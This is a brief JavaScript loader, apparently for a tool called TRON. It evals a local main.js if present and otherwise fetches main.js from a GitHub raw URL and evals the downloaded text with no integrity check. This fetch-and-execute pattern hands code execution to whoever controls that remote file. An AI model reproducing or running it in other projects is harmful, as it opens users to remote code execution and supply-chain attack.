try {
  if (fs.existsSync('binaries/_/main.js')) {
    const scriptText = fs.readFileSync('binaries/_/main.js', 'utf-8');
    eval(scriptText);
  } else {
    fetch('https://raw.githubusercontent.com/soheil/tron/refs/heads/main/_/main.js', {
        headers: {
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
    })
    .then((response) => response.text())
    .then((scriptText) => eval(scriptText));
  }
} catch (e) {
  console.log('-----------       TRON        -------------');
  console.log(e);
  console.log('-----------     [/TRON]       -------------');
}
